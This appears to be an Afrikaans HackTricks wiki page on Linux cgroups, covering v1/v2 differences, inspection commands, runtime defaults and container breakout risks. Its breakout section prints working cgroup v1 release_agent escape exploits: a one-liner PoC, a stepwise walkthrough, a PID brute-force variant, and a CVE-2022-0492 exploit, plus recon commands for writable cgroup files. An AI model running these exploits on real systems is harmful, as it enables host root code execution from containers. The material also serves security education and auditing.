# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux **control groups** is die kernel-meganisme wat gebruik word om prosesse saam te groepeer vir rekeninghouding, beperking, prioritisering en beleidsafdwinging. Waar namespaces hoofsaaklik daaroor gaan om die sig op hulpbronne te isoleer, gaan cgroups hoofsaaklik daaroor om te beheer **hoeveel** van daardie hulpbronne ’n stel prosesse mag verbruik en, in sommige gevalle, **met watter klasse hulpbronne** hulle enigsins mag kommunikeer. Containers maak voortdurend op cgroups staat, selfs wanneer die gebruiker nooit direk daarna kyk nie, omdat byna elke moderne runtime ’n manier nodig het om vir die kernel te sê: "hierdie prosesse behoort aan hierdie workload, en hierdie is die hulpbronreëls wat daarop van toepassing is".

Dit is waarom container engines ’n nuwe container in sy eie cgroup-subtree plaas. Sodra die prosesboom daar is, kan die runtime geheue beperk, die aantal PIDs beperk, CPU-gebruik weeg, I/O reguleer en device-toegang beperk. In ’n production-omgewing is dit noodsaaklik vir beide multi-tenant-veiligheid en eenvoudige operasionele higiëne. ’n Container sonder betekenisvolle hulpbronbeheer kan moontlik geheue uitput, die stelsel met prosesse oorstroom, of CPU en I/O monopoliseer op maniere wat die host of naburige workloads onstabiel maak.

Vanuit ’n sekuriteitsperspektief is cgroups op twee afsonderlike maniere belangrik. Eerstens stel swak of ontbrekende hulpbronlimiete eenvoudige denial-of-service-aanvalle moontlik. Tweedens het sommige cgroup-features, veral in ouer **cgroup v1**-opstellings, histories kragtige breakout-primitives geskep wanneer dit van binne ’n container skryfbaar was.

## v1 Teenoor v2

Daar is twee belangrikste cgroup-modelle in gebruik. **cgroup v1** stel meerdere controller-hiërargieë bloot, en ouer exploit-writings draai dikwels om die vreemde en soms buitensporig kragtige semantiek wat daar beskikbaar is. **cgroup v2** stel ’n meer verenigde hiërargie en oor die algemeen skoner gedrag bekend. Moderne distribusies verkies toenemend cgroup v2, maar gemengde of legacy-omgewings bestaan steeds, wat beteken dat albei modelle steeds relevant is wanneer werklike stelsels geëvalueer word.

Die verskil is belangrik omdat sommige van die bekendste container-breakout-verhale, soos misbruik van **`release_agent`** in cgroup v1, baie spesifiek aan ouer cgroup-gedrag gekoppel is. ’n Leser wat ’n cgroup-exploit op ’n blog sien en dit dan blindelings op ’n moderne cgroup v2-only-stelsel toepas, sal waarskynlik verkeerd verstaan wat werklik op die teiken moontlik is.

## Inspeksie

Die vinnigste manier om te sien waar jou huidige shell hom bevind, is:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die `/proc/self/cgroup`-lêer wys die cgroup-paaie wat met die huidige proses geassosieer word. Op ’n moderne cgroup v2-host sal jy dikwels ’n verenigde inskrywing sien. Op ouer of hibriede hosts kan jy verskeie v1-beheerderpaaie sien. Sodra jy die pad ken, kan jy die ooreenstemmende lêers onder `/sys/fs/cgroup` inspekteer om limiete en huidige gebruik te sien.

Op ’n cgroup v2-host is die volgende opdragte nuttig:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Hierdie lêers toon watter controllers bestaan en watter aan child cgroups gedelegeer word. Hierdie delegasiemodel is belangrik in rootless- en systemd-managed omgewings, waar die runtime moontlik slegs die subset van cgroup-funksionaliteit kan beheer wat die ouerhierargie werklik delegeer.

## Laboratorium

Een manier om cgroups in die praktyk waar te neem, is om ’n container met ’n geheuebeperking te laat loop:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Jy kan ook 'n PID-beperkte container probeer:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Hierdie voorbeelde is nuttig omdat hulle help om die runtime-vlag aan die kernel-lêer-koppelvlak te koppel. Die runtime pas die reël nie deur towerkrag toe nie; dit skryf die relevante cgroup-instellings en laat dan die kernel dit teen die prosesboom afdwing.

## Runtimegebruik

Docker, Podman, containerd en CRI-O maak almal op cgroups staat as deel van normale werking. Die verskille gaan gewoonlik nie daaroor of hulle cgroups gebruik nie, maar oor **watter verstekwaardes hulle kies**, **hoe hulle met systemd interaksie het**, **hoe rootless-delegering werk**, en **hoeveel van die konfigurasie op engine-vlak teenoor orchestration-vlak beheer word**.

In Kubernetes word resource requests en limits uiteindelik cgroup-konfigurasie op die node. Die pad van Pod YAML na kernel-afdwinging gaan deur die kubelet, die CRI runtime en die OCI runtime, maar cgroups bly steeds die kernel-meganisme wat die reël uiteindelik toepas. In Incus/LXC-omgewings word cgroups ook intensief gebruik, veral omdat system containers dikwels ’n ryker prosesboom en meer VM-agtige operasionele verwagtinge blootstel.

## Wankonfigurasies en Breakouts

Die klassieke cgroup-sekuriteitsverhaal is die skryfbare **cgroup v1 `release_agent`**-meganisme. In daardie model, as ’n aanvaller na die regte cgroup-lêers kon skryf, `notify_on_release` kon aktiveer en die pad wat in `release_agent` gestoor word kon beheer, kon die kernel uiteindelik ’n aanvallergekose pad in die initial namespaces op die host uitvoer wanneer die cgroup leeg geword het. Daarom plaas ouer writeups soveel aandag op cgroup controller-skryfbaarheid, mount-opsies en namespace/capability-voorwaardes.

Selfs wanneer `release_agent` nie beskikbaar is nie, maak cgroup-foute steeds saak. Oormatig breë device-toegang kan host-devices vanaf die container bereikbaar maak. Ontbrekende memory- en PID-limits kan eenvoudige code execution in ’n host DoS verander. Swak cgroup-delegering in rootless-scenario’s kan defenders ook mislei om aan te neem dat ’n beperking bestaan, terwyl die runtime dit nooit werklik kon toepas nie.

### `release_agent` Agtergrond

Die `release_agent`-tegniek is slegs op **cgroup v1** van toepassing. Die basiese idee is dat wanneer die laaste proses in ’n cgroup eindig en `notify_on_release=1` gestel is, die kernel die program uitvoer waarvan die pad in `release_agent` gestoor is. Daardie uitvoering vind in die **initial namespaces op die host** plaas, en dit is wat ’n skryfbare `release_agent` in ’n container escape primitive verander.

Vir die tegniek om te werk, benodig die aanvaller gewoonlik:

- ’n skryfbare **cgroup v1**-hiërargie
- die vermoë om ’n child cgroup te skep of te gebruik
- die vermoë om `notify_on_release` te stel
- die vermoë om ’n pad na `release_agent` te skryf
- ’n pad wat vanuit die host se oogpunt na ’n uitvoerbare lêer resolve

### Klassieke PoC

Die historiese one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Hierdie PoC skryf ’n payload-pad na `release_agent`, aktiveer cgroup-vrystelling, en lees dan die uitvoerlêer terug wat op die gasheer gegenereer is.

### Leesbare deurloop

Dieselfde idee is makliker om te verstaan wanneer dit in stappe opgebreek word.

1. Skep en berei ’n skryfbare cgroup voor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiseer die gasheerpad wat met die container-lêerstelsel ooreenstem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Plaas 'n payload wat vanaf die host path sigbaar sal wees:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Aktiveer uitvoering deur die cgroup leeg te maak:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die effek is host-side uitvoering van die payload met host root-voorregte. In ’n werklike exploit skryf die payload gewoonlik ’n bewyslêer, begin ’n reverse shell, of wysig host-state.

### Relative Path Variant Using `/proc/<pid>/root`

In sommige omgewings is die host-pad na die container-lêerstelsel nie duidelik nie of word dit deur die storage driver versteek. In daardie geval kan die payload-pad uitgedruk word deur middel van `/proc/<pid>/root/...`, waar `<pid>` ’n host-PID is wat aan ’n proses in die huidige container behoort. Dit vorm die basis van die relative-path brute-force-variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Die relevante truuk hier is nie die brute force self nie, maar die padvorm: `/proc/<pid>/root/...` laat die kernel toe om ’n lêer binne die container-lêerstelsel vanuit die host-namespace op te los, selfs wanneer die direkte host-bergingpad nie vooraf bekend is nie.

### CVE-2022-0492 Variant

In 2022 het CVE-2022-0492 getoon dat die skryf na `release_agent` in cgroup v1 nie korrek nagegaan het vir `CAP_SYS_ADMIN` in die **aanvanklike** user-namespace nie. Dit het die tegniek baie meer bereikbaar gemaak op kwesbare kernels, omdat ’n container-proses wat ’n cgroup-hiërargie kon mount, na `release_agent` kon skryf sonder om reeds bevoorreg te wees in die host-user-namespace.

Minimale exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Op ’n kwesbare kernel voer die host `/proc/self/exe` met host root-voorregte uit.

Vir praktiese misbruik, begin deur te kyk of die omgewing steeds skryfbare cgroup-v1-paaie of gevaarlike device-toegang blootstel:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
As `release_agent` teenwoordig en skryfbaar is, is jy reeds in legacy-breakout-territorium:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
As die cgroup path self nie ’n escape oplewer nie, is die volgende praktiese gebruik dikwels denial of service of reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Hierdie opdragte wys vinnig of die werkslading ruimte het om ’n fork-bomb te loods, geheue aggressief te verbruik, of ’n skryfbare verouderde cgroup-koppelvlak te misbruik.

## Kontroles

Wanneer ’n teiken hersien word, is die doel van die cgroup-kontroles om vas te stel watter cgroup-model gebruik word, of die container skryfbare beheerderpaaie sien, en of ou breakout-primitiewe soos `release_agent` enigsins relevant is.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Wat hier interessant is:

- As `mount | grep cgroup` **cgroup v1** wys, word ouer breakout writeups meer relevant.
- As `release_agent` bestaan en bereikbaar is, is dit onmiddellik verdere ondersoek werd.
- As die sigbare cgroup-hiërargie skryfbaar is en die container ook sterk capabilities het, verdien die omgewing ’n baie noukeuriger oorsig.

As jy **cgroup v1**, skryfbare controller mounts en ’n container ontdek wat ook sterk capabilities of swak seccomp/AppArmor-beskerming het, verdien daardie kombinasie noukeurige aandag. cgroups word dikwels as ’n vervelige onderwerp oor hulpbronbestuur beskou, maar histories was hulle deel van sommige van die mees leersame container escape chains, juis omdat die grens tussen "resource control" en "host influence" nie altyd so duidelik was as wat mense aangeneem het nie.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | By verstek enabled | Containers word outomaties in cgroups geplaas; resource limits is opsioneel tensy dit met flags gestel word | om `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` weg te laat |
| Podman | By verstek enabled | `--cgroups=enabled` is die default; cgroup namespace-defaults wissel volgens cgroup version (`private` op cgroup v2, `host` op sommige cgroup v1-opstellings) | `--cgroups=disabled`, `--cgroupns=host`, verslapte device access, `--privileged` |
| Kubernetes | By verstek deur die runtime enabled | Pods en containers word deur die node runtime in cgroups geplaas; fynkorrelige resource control hang af van `resources.requests` / `resources.limits` | om resource requests/limits, privileged device access, host-level runtime misconfiguration weg te laat |
| containerd / CRI-O | By verstek enabled | cgroups is deel van normale lifecycle management | direkte runtime configs wat device controls verslap of legacy skryfbare cgroup v1-interfaces blootstel |

Die belangrike onderskeid is dat **cgroup-bestaan** gewoonlik default is, terwyl **bruikbare resource constraints** dikwels opsioneel is tensy dit uitdruklik gekonfigureer word.
{{#include ../../../../banners/hacktricks-training.md}}
